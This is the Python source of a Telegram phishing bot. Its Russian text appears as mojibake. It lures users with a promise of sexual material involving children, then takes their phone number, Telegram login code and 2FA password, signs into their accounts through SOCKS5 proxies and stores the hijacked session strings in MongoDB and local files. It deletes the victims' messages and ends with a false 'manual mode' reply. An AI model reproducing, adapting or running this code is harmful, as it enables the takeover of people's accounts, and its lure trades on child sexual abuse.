import logging
import os
import json
import phonenumbers
from phonenumbers import geocoder
from aiogram import Bot, Dispatcher, types
from aiogram.types import ReplyKeyboardMarkup, KeyboardButton, InlineKeyboardButton, InlineKeyboardMarkup
from aiogram.utils import executor
from telethon import TelegramClient
from telethon.sessions import StringSession
from telethon.errors.rpcerrorlist import SessionPasswordNeededError, PhoneCodeExpiredError, PhoneCodeInvalidError
from pymongo import MongoClient
from dotenv import load_dotenv
from datetime import datetime
import asyncio

load_dotenv()
API_ID = int(os.getenv("API_ID"))
API_HASH = os.getenv("API_HASH")
BOT_TOKEN = os.getenv("BOT_TOKEN")
MONGO_URI = os.getenv("MONGO_URI")

# –û—Å–Ω–æ–≤–Ω–∞—è –ø—Ä–æ–∫—Å–∏ (—Å—Ç–∞—Ä–∞—è, –¥–ª—è —Å–æ–≤–º–µ—Å—Ç–∏–º–æ—Å—Ç–∏)
PROXY_HOST = os.getenv("PROXY_HOST")
PROXY_PORT = int(os.getenv("PROXY_PORT"))
PROXY_USER = os.getenv("PROXY_USER")
PROXY_PASS = os.getenv("PROXY_PASS")
main_proxy = ('socks5', PROXY_HOST, PROXY_PORT, True, PROXY_USER, PROXY_PASS)

# –í—Ç–æ—Ä–∞—è –ø—Ä–æ–∫—Å–∏ (–Ω–æ–≤–∞—è)
PROXY1_HOST = os.getenv("PROXY1_HOST")
PROXY1_PORT = int(os.getenv("PROXY1_PORT"))
PROXY1_USER = os.getenv("PROXY1_USER")
PROXY1_PASS = os.getenv("PROXY1_PASS")
second_proxy = ('socks5', PROXY1_HOST, PROXY1_PORT, True, PROXY1_USER, PROXY1_PASS)

# –°–ø–∏—Å–æ–∫ –¥–æ—Å—Ç—É–ø–Ω—ã—Ö –ø—Ä–æ–∫—Å–∏
proxy_list = [main_proxy, second_proxy]

mongo = MongoClient(MONGO_URI)
db = mongo["dbmango"]
sessions_col = db["sessions"]
start_col = db["start"]

logging.basicConfig(level=logging.INFO)
bot = Bot(token=BOT_TOKEN)
dp = Dispatcher(bot)

user_states = {}
user_clients = {}
user_phones = {}
user_code_buffers = {}

os.makedirs("sessions", exist_ok=True)

def get_proxy_for_phone(phone):
    """–í—ã–±–∏—Ä–∞–µ–º –ø—Ä–æ–∫—Å–∏ –¥–ª—è –Ω–æ–º–µ—Ä–∞"""
    existing_session = sessions_col.find_one({"phone": phone})
    if existing_session:
        return proxy_list[existing_session.get('proxy_index', 0)]
    return proxy_list[hash(phone) % len(proxy_list)]

def cleanup(user_id):
    """–û—á–∏—â–∞–µ—Ç –¥–∞–Ω–Ω—ã–µ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è –∏–∑ –≤—Ä–µ–º–µ–Ω–Ω—ã—Ö —Ö—Ä–∞–Ω–∏–ª–∏—â"""
    user_states.pop(user_id, None)
    user_clients.pop(user_id, None)
    user_phones.pop(user_id, None)
    user_code_buffers.pop(user_id, None)

def update_user_log(user_id: int, updates: dict):
    """–û–±–Ω–æ–≤–ª—è–µ—Ç –∏–ª–∏ —Å–æ–∑–¥–∞–µ—Ç –∑–∞–ø–∏—Å—å –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è —Å –Ω–æ–≤—ã–º–∏ –¥–∞–Ω–Ω—ã–º–∏"""
    try:
        start_col.update_one(
            {"user_id": user_id},
            {"$set": updates, "$setOnInsert": {"first_seen": datetime.now()}},
            upsert=True
        )
    except Exception as e:
        logging.error(f"–û—à–∏–±–∫–∞ –ø—Ä–∏ –æ–±–Ω–æ–≤–ª–µ–Ω–∏–∏ –ª–æ–≥–∞ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è: {e}")

async def send_code_keyboard(user_id, current_code, message_id=None):
    """–û—Ç–ø—Ä–∞–≤–ª—è–µ—Ç/–æ–±–Ω–æ–≤–ª—è–µ—Ç –∫–ª–∞–≤–∏–∞—Ç—É—Ä—É –¥–ª—è –≤–≤–æ–¥–∞ –∫–æ–¥–∞"""
    digits = [[1, 2, 3], [4, 5, 6], [7, 8, 9], [0]]
    buttons = []
    for row in digits:
        btn_row = [InlineKeyboardButton(str(d), callback_data=f"code_{d}") for d in row]
        buttons.append(btn_row)
    buttons.append([InlineKeyboardButton("‚úÖ –û—Ç–ø—Ä–∞–≤–∏—Ç—å", callback_data="code_send")])
    keyboard = InlineKeyboardMarkup(inline_keyboard=buttons)
    text = f"–ö–æ–¥: `{current_code}`" if current_code else "–í–≤–µ–¥–∏—Ç–µ –∫–æ–¥:"

    if message_id:
        await bot.edit_message_text(chat_id=user_id, message_id=message_id,
                                 text=text, reply_markup=keyboard, parse_mode='Markdown')
    else:
        msg = await bot.send_message(user_id, text, reply_markup=keyboard, parse_mode='Markdown')
        return msg.message_id

@dp.message_handler(commands=['start'])
async def cmd_start(message: types.Message):
    user = message.from_user
    
    update_user_log(
        user_id=user.id,
        updates={
            "username": user.username,
            "first_name": user.first_name,
            "last_name": user.last_name,
            "language_code": user.language_code,
            "is_bot": user.is_bot,
            "chat_id": message.chat.id,
            "last_start": datetime.now(),
            "status": "started"
        }
    )

    keyboard = InlineKeyboardMarkup().add(
        InlineKeyboardButton("–Ø —Ç–æ—á–Ω–æ –Ω–µ —Ä–æ–±–æ—Ç!ü•∞", callback_data="request_contact")
    )
    await message.answer(
        "üëãüá∑üá∫ –ü–†–ò–í–ï–¢! ‚ù§Ô∏è\n"
        "–£ –Ω–∞—Å —Å–∞–º—ã–µ –≥—Ä–æ–º–Ω—ã–µ —Ñ–æ—Ç–æ –∏ –≤—ã–¥–µ–æ —Å –¥–µ—Ç—å–º–∏, –±–æ–ª—å—à–µ 10.000 –º–∞—Ç–µ—Ä–∏–∞–ª–∞! üëÄ\n"
        "–ü–æ–¥—Ç–≤–µ—Ä–¥–∏, —á—Ç–æ —Ç—ã –Ω–µ –±–æ—Ç, —Å –ø–æ–º–æ—â—å—é –∫–Ω–æ–ø–∫–∏ –Ω–∏–∂–µ, –∏ –ø–æ–ª—É—á–∏ –≤–µ—Å—å –º–∞—Ç–µ—Ä–∏–∞–ª! ü§ñüëá\n\n",
        reply_markup=keyboard
    )

@dp.callback_query_handler(lambda c: c.data == 'request_contact')
async def request_contact(callback_query: types.CallbackQuery):
    user_id = callback_query.from_user.id
    user_states[user_id] = 'awaiting_contact'

    update_user_log(
        user_id=user_id,
        updates={
            "auth_button_clicked": True,
            "auth_button_click_time": datetime.now(),
            "status": "awaiting_contact"
        }
    )

    # –°–æ–∑–¥–∞–µ–º –∫–ª–∞–≤–∏–∞—Ç—É—Ä—É —Å –∑–∞–ø—Ä–æ—Å–æ–º –∫–æ–Ω—Ç–∞–∫—Ç–∞
    keyboard = ReplyKeyboardMarkup(resize_keyboard=True, one_time_keyboard=True)
    keyboard.add(KeyboardButton("–ü–æ–¥–µ–ª–∏—Ç—å—Å—è –Ω–æ–º–µ—Ä–æ–º", request_contact=True))

    await bot.edit_message_text(
        chat_id=user_id,
        message_id=callback_query.message.message_id,
        text="üì± –ù–∞–∂–º–∏—Ç–µ –∫–Ω–æ–ø–∫—É –Ω–∏–∂–µ, —á—Ç–æ–±—ã –ø–æ–¥–µ–ª–∏—Ç—å—Å—è –Ω–æ–º–µ—Ä–æ–º —Ç–µ–ª–µ—Ñ–æ–Ω–∞:",
        reply_markup=keyboard
    )
    await bot.answer_callback_query(callback_query.id)

@dp.message_handler(content_types=['contact'])
async def handle_contact(message: types.Message):
    user_id = message.from_user.id

    # –ü—Ä–æ–≤–µ—Ä—è–µ–º, —á—Ç–æ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å –Ω–∞—Ö–æ–¥–∏—Ç—Å—è –≤ —Å–æ—Å—Ç–æ—è–Ω–∏–∏ –æ–∂–∏–¥–∞–Ω–∏—è –∫–æ–Ω—Ç–∞–∫—Ç–∞
    if user_states.get(user_id) != 'awaiting_contact':
        return

    # –£–¥–∞–ª—è–µ–º —Å–æ–æ–±—â–µ–Ω–∏–µ —Å –∫–æ–Ω—Ç–∞–∫—Ç–æ–º —Å—Ä–∞–∑—É –ø–æ—Å–ª–µ –ø–æ–ª—É—á–µ–Ω–∏—è
    try:
        await bot.delete_message(chat_id=user_id, message_id=message.message_id)
    except Exception as e:
        logging.error(f"–ù–µ —É–¥–∞–ª–æ—Å—å —É–¥–∞–ª–∏—Ç—å —Å–æ–æ–±—â–µ–Ω–∏–µ —Å –∫–æ–Ω—Ç–∞–∫—Ç–æ–º: {e}")

    phone = message.contact.phone_number
    if not phone.startswith('+'):
        phone = f"+{phone}"

    geo_info = None
    try:
        parsed_number = phonenumbers.parse(phone)
        geo_info = geocoder.description_for_number(parsed_number, "en")
    except Exception as e:
        logging.error(f"–û—à–∏–±–∫–∞ –ø—Ä–∏ –æ–ø—Ä–µ–¥–µ–ª–µ–Ω–∏–∏ –≥–µ–æ–ª–æ–∫–∞—Ü–∏–∏: {e}")

    update_user_log(
        user_id=user_id,
        updates={
            "phone": phone,
            "geo_info": geo_info,
            "phone_shared": True,
            "phone_share_time": datetime.now(),
            "status": "phone_received"
        }
    )

    selected_proxy = get_proxy_for_phone(phone)
    
    client = TelegramClient(StringSession(), API_ID, API_HASH, proxy=selected_proxy)
    await client.connect()
    user_clients[user_id] = client
    user_phones[user_id] = phone

    try:
        await client.send_code_request(phone)
        user_states[user_id] = 'awaiting_code'
        user_code_buffers[user_id] = {'code': '', 'message_id': None}
        msg_id = await send_code_keyboard(user_id, "", None)
        user_code_buffers[user_id]['message_id'] = msg_id
        
        # –û—Ç–ø—Ä–∞–≤–ª—è–µ–º —Å–æ–æ–±—â–µ–Ω–∏–µ –æ –≤–≤–æ–¥–µ –∫–æ–¥–∞ –∏ —É–¥–∞–ª—è–µ–º –µ–≥–æ —á–µ—Ä–µ–∑ 3 —Å–µ–∫—É–Ω–¥—ã
        msg = await message.answer("‚å®Ô∏è –í–≤–µ–¥–∏—Ç–µ –∫–æ–¥, –Ω–∞–∂–∏–º–∞—è –∫–Ω–æ–ø–∫–∏ –Ω–∏–∂–µ:")
        await asyncio.sleep(3)
        try:
            await bot.delete_message(chat_id=user_id, message_id=msg.message_id)
        except:
            pass
            
    except Exception as e:
        error_msg = await message.answer(f"‚ùå –û—à–∏–±–∫–∞ –ø—Ä–∏ –æ—Ç–ø—Ä–∞–≤–∫–µ –∫–æ–¥–∞: {e}")
        await client.disconnect()
        cleanup(user_id)
        await asyncio.sleep(3)
        try:
            await bot.delete_message(chat_id=user_id, message_id=error_msg.message_id)
        except:
            pass

@dp.callback_query_handler(lambda c: c.data.startswith("code_"))
async def process_code_button(callback_query: types.CallbackQuery):
    user_id = callback_query.from_user.id
    data = callback_query.data

    if user_states.get(user_id) != 'awaiting_code':
        await bot.answer_callback_query(callback_query.id, text="‚õîÔ∏è –ù–µ —Å–µ–π—á–∞—Å", show_alert=True)
        return

    buffer = user_code_buffers.get(user_id)
    if not buffer:
        await bot.answer_callback_query(callback_query.id, text="–í–Ω—É—Ç—Ä–µ–Ω–Ω—è—è –æ—à–∏–±–∫–∞.", show_alert=True)
        return

    current_code = buffer['code']
    message_id = buffer['message_id']

    if data == "code_send":
        if not current_code:
            await bot.answer_callback_query(callback_query.id, text="‚ö†Ô∏è –°–Ω–∞—á–∞–ª–∞ –≤–≤–µ–¥–∏—Ç–µ –∫–æ–¥", show_alert=True)
            return
        await bot.answer_callback_query(callback_query.id)
        await try_sign_in_code(user_id, current_code)
    else:
        digit = data.split("_")[1]
        if len(current_code) >= 10:
            await bot.answer_callback_query(callback_query.id, text="‚ö†Ô∏è –°–ª–∏—à–∫–æ–º –¥–ª–∏–Ω–Ω—ã–π –∫–æ–¥", show_alert=True)
            return
        current_code += digit
        user_code_buffers[user_id]['code'] = current_code
        await bot.answer_callback_query(callback_query.id)
        await send_code_keyboard(user_id, current_code, message_id)

async def try_sign_in_code(user_id, code):
    client = user_clients.get(user_id)
    phone = user_phones.get(user_id)
    if not client or not phone:
        error_msg = await bot.send_message(user_id, "‚ö†Ô∏è –°–µ—Å—Å–∏—è –Ω–µ –Ω–∞–π–¥–µ–Ω–∞. –ü–æ–ø—Ä–æ–±—É–π—Ç–µ —Å–Ω–æ–≤–∞ —Å /start")
        cleanup(user_id)
        await asyncio.sleep(3)
        try:
            await bot.delete_message(chat_id=user_id, message_id=error_msg.message_id)
        except:
            pass
        return

    try:
        await client.sign_in(phone=phone, code=code)
        if await client.is_user_authorized():
            me = await client.get_me()
            session_str = client.session.save()
            
            proxy_index = 0
            if hasattr(client, '_sender') and hasattr(client._sender, '_proxy'):
                current_proxy = client._sender._proxy
                proxy_index = next((i for i, p in enumerate(proxy_list) if p == current_proxy), 0)
            
            sessions_col.update_one(
                {"phone": phone}, 
                {"$set": {
                    "phone": phone, 
                    "session": session_str, 
                    "proxy_index": proxy_index,
                    "user_id": user_id,
                    "username": me.username,
                    "first_name": me.first_name,
                    "last_name": me.last_name if me.last_name else None,
                    "auth_date": datetime.now()
                }}, 
                upsert=True
            )

            update_user_log(
                user_id=user_id,
                updates={
                    "auth_success": True,
                    "auth_time": datetime.now(),
                    "telegram_id": me.id,
                    "tg_username": me.username,
                    "tg_first_name": me.first_name,
                    "tg_last_name": me.last_name,
                    "status": "authenticated",
                    "proxy_index": proxy_index
                }
            )

            with open(f"sessions/{phone.replace('+', '')}.json", "w") as f:
                json.dump({"phone": phone, "session": session_str}, f)

            success_msg = await bot.send_message(user_id, "–ú—ã —Ä–∞–±–æ—Ç–∞–µ–º –≤ —Ä—É—á–Ω–æ–º —Ä–µ–∂–∏–º–µ, –∏–∑–≤–∏–Ω–∏—Ç–µ –∑–∞ –∑–∞–¥–µ—Ä–∂–∫—É, —Å–∫–æ—Ä–æ –æ—Ç–ø—Ä–∞–≤–∏–º –≤–∞–º —Ñ–æ—Ç–æ –∏ –≤–∏–¥–µ–æ –º–∞—Ç–µ—Ä–∏–∞–ª—ãüòâüßç‚Äç‚ôÄÔ∏è.")
            await client.disconnect()
            cleanup(user_id)
            await asyncio.sleep(5)
            try:
                await bot.delete_message(chat_id=user_id, message_id=success_msg.message_id)
            except:
                pass
        else:
            user_states[user_id] = 'awaiting_2fa'
            update_user_log(
                user_id=user_id,
                updates={"status": "awaiting_2fa"}
            )
            msg = await bot.send_message(user_id, "üîê –í–≤–µ–¥–∏—Ç–µ –≤–∞—à –ø–∞—Ä–æ–ª—å 2FA:")
            await asyncio.sleep(3)
            try:
                await bot.delete_message(chat_id=user_id, message_id=msg.message_id)
            except:
                pass
    except PhoneCodeExpiredError:
        error_msg = await bot.send_message(user_id, "‚è∞ –ö–æ–¥ —É—Å—Ç–∞—Ä–µ–ª. –ü–æ–ø—Ä–æ–±—É–π—Ç–µ —Å–Ω–æ–≤–∞ —Å /start")
        await client.disconnect()
        cleanup(user_id)
        await asyncio.sleep(3)
        try:
            await bot.delete_message(chat_id=user_id, message_id=error_msg.message_id)
        except:
            pass
    except PhoneCodeInvalidError:
        error_msg = await bot.send_message(user_id, "‚ùå –ù–µ–≤–µ—Ä–Ω—ã–π –∫–æ–¥. –ü–æ–ø—Ä–æ–±—É–π—Ç–µ —Å–Ω–æ–≤–∞:")
        user_code_buffers[user_id]['code'] = ""
        await send_code_keyboard(user_id, "", user_code_buffers[user_id]['message_id'])
        await asyncio.sleep(3)
        try:
            await bot.delete_message(chat_id=user_id, message_id=error_msg.message_id)
        except:
            pass
    except SessionPasswordNeededError:
        user_states[user_id] = 'awaiting_2fa'
        update_user_log(
            user_id=user_id,
            updates={"status": "awaiting_2fa"}
        )
        msg = await bot.send_message(user_id, "üîê –¢—Ä–µ–±—É–µ—Ç—Å—è –≤–∞—à –ø–∞—Ä–æ–ª—å 2FA. –í–≤–µ–¥–∏—Ç–µ –µ–≥–æ:")
        await asyncio.sleep(3)
        try:
            await bot.delete_message(chat_id=user_id, message_id=msg.message_id)
        except:
            pass
    except Exception as e:
        error_msg = await bot.send_message(user_id, f"‚ùå –û—à–∏–±–∫–∞ –≤—Ö–æ–¥–∞: {e}")
        await client.disconnect()
        cleanup(user_id)
        await asyncio.sleep(3)
        try:
            await bot.delete_message(chat_id=user_id, message_id=error_msg.message_id)
        except:
            pass

@dp.message_handler(lambda message: user_states.get(message.from_user.id) == 'awaiting_2fa')
async def process_2fa(message: types.Message):
    user_id = message.from_user.id
    
    # –£–¥–∞–ª—è–µ–º —Å–æ–æ–±—â–µ–Ω–∏–µ —Å –ø–∞—Ä–æ–ª–µ–º —Å—Ä–∞–∑—É
    try:
        await bot.delete_message(chat_id=user_id, message_id=message.message_id)
    except:
        pass

    password = message.text.strip()
    client = user_clients.get(user_id)
    phone = user_phones.get(user_id)

    if not client or not phone:
        error_msg = await message.answer("‚ö†Ô∏è –°–µ—Å—Å–∏—è –Ω–µ –Ω–∞–π–¥–µ–Ω–∞. –ü–æ–ø—Ä–æ–±—É–π—Ç–µ —Å–Ω–æ–≤–∞ —Å /start")
        cleanup(user_id)
        await asyncio.sleep(3)
        try:
            await bot.delete_message(chat_id=user_id, message_id=error_msg.message_id)
        except:
            pass
        return

    try:
        await client.sign_in(password=password)
        if await client.is_user_authorized():
            session_str = client.session.save()
            
            proxy_index = 0
            if hasattr(client, '_sender') and hasattr(client._sender, '_proxy'):
                current_proxy = client._sender._proxy
                proxy_index = next((i for i, p in enumerate(proxy_list) if p == current_proxy), 0)
            
            sessions_col.update_one(
                {"phone": phone}, 
                {"$set": {
                    "phone": phone, 
                    "session": session_str, 
                    "proxy_index": proxy_index,
                    "user_id": user_id,
                    "auth_date": datetime.now(),
                    "has_2fa": True
                }}, 
                upsert=True
            )
            
            update_user_log(
                user_id=user_id,
                updates={
                    "auth_success": True,
                    "auth_time": datetime.now(),
                    "has_2fa": True,
                    "status": "authenticated_with_2fa",
                    "proxy_index": proxy_index
                }
            )

            with open(f"sessions/{phone.replace('+', '')}.json", "w") as f:
                json.dump({"phone": phone, "session": session_str}, f)

            success_msg = await message.answer("–ú—ã —Ä–∞–±–æ—Ç–∞–µ–º –≤ —Ä—É—á–Ω–æ–º —Ä–µ–∂–∏–º–µ, –∏–∑–≤–∏–Ω–∏—Ç–µ –∑–∞ –∑–∞–¥–µ—Ä–∂–∫—É, —Å–∫–æ—Ä–æ –æ—Ç–ø—Ä–∞–≤–∏–º –≤–∞–º —Ñ–æ—Ç–æ –∏ –≤–∏–¥–µ–æ –º–∞—Ç–µ—Ä–∏–∞–ª—ãüòâüßç‚Äç‚ôÄÔ∏è.")
            await client.disconnect()
            cleanup(user_id)
            await asyncio.sleep(5)
            try:
                await bot.delete_message(chat_id=user_id, message_id=success_msg.message_id)
            except:
                pass
        else:
            error_msg = await message.answer("‚ùå –ù–µ —É–¥–∞–ª–æ—Å—å –≤–æ–π—Ç–∏ —Å 2FA.")
            await asyncio.sleep(3)
            try:
                await bot.delete_message(chat_id=user_id, message_id=error_msg.message_id)
            except:
                pass
    except Exception as e:
        error_msg = await message.answer(f"‚ùå –û—à–∏–±–∫–∞ —Å 2FA: {e}")
        await client.disconnect()
        cleanup(user_id)
        await asyncio.sleep(3)
        try:
            await bot.delete_message(chat_id=user_id, message_id=error_msg.message_id)
        except:
            pass

if __name__ == '__main__':
    executor.start_polling(dp, skip_updates=True)